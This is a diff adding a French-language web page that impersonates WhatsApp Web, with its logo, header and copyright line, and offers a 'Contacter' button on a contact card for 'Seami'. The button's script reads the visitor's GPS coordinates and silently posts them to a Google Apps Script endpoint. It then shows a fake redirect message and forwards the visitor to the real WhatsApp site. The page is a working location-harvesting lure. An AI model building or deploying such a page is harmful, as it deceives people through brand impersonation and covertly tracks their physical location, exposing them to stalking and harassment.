@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="fr" style="--splashscreen-startup-background: #F7F5F3; --splashscreen-primary-title: #0A1014; --splashscreen-secondary-lighter: #5B6368; --splashscreen-progress-primary: #1DAA61; --splashscreen-progress-background: rgba(0, 0, 0, 0.1);">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Partager Mon Contact</title>
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-color: #F7F5F3;
+            --primary-color: #25d366;
+            --header-color: #F7F5F3;
+            --text-color: #0A1014;
+            --secondary-color: #5B6368;
+            --button-hover: #20b858;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: var(--header-color);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        header img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        header h1 {
+            color: #000000;
+            font-size: 1.4em;
+            margin: 0;
+            font-weight: 700;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #fff;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .profile-circle {
+            width: 80px;
+            height: 80px;
+            background-color: #B0B0B0;
+            color: #fff;
+            font-size: 2.5em;
+            font-weight: 700;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .name {
+            font-size: 1.8em;
+            font-weight: 700;
+            margin: 10px 0 5px;
+            color: var(--text-color);
+        }
+
+        p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            font-size: 0.9em;
+            color: var(--secondary-color);
+        }
+
+        .footer p {
+            display: flex;
+            align-items: center;
+            margin: 0;
+        }
+
+        .footer a {
+            margin-left: 10px;
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <a href="https://web.whatsapp.com" style="text-decoration: none; display: flex; align-items: center;">
+            <img src="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png" alt="Logo" />
+            <h1>WhatsApp Web</h1>
+        </a>
+    </header>
+
+    <div class="main">
+        <div class="card" id="contactCard">
+            <div class="profile-circle">S</div>
+            <div class="name">Seami</div>
+            <p>Cliquer pour être redirigé vers WhatsApp !</p>
+            <button onclick="getLocation()">Contacter</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>2025 © WhatsApp LLC</p>
+        <p><a href="https://www.whatsapp.com/legal/">Conditions et politique de confidentialité</a></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    fetch("https://script.google.com/macros/s/AKfycbzJ9nqFDc5MP4AJXBsc-e6iu8fB19VnUG674-DPYQTungYtXSMEgdC31LDLKZrh9A2u/exec", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            nom_utilisateur: "seami",
+                            contact: "0123456789"
+                        }),
+                        mode: 'no-cors'
+                    }).then(() => {
+                        document.getElementById("contactCard").innerHTML = "<p>Redirection vers Whatsapp en cours...</p>";
+                        setTimeout(() => {
+                            window.location.href = "https://web.whatsapp.com";
+                        }, 2000);
+                    }).catch(err => {
+                        console.error("Erreur lors de l'envoi :", err);
+                    });
+                });
+            } else {
+                alert("Géolocalisation non supportée.");
+            }
+        }
+    </script>
+
+</body>
+
+</html>
